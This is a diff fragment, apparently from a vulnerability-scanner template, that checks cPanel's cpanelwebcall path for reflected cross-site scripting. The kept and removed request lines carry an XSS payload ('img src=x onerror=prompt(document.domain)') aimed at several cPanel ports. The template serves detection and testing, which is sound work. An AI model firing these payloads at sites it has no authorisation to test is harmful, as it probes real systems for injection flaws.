@@ -16,8 +16,6 @@ http:
       - '{{BaseURL}}:2083/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
       - '{{BaseURL}}:2082/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
       - '{{BaseURL}}:2086/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
-      - '{{BaseURL}}/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
-      - '{{BaseURL}}:80/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
 
     stop-at-first-match: true
     matchers-condition: and
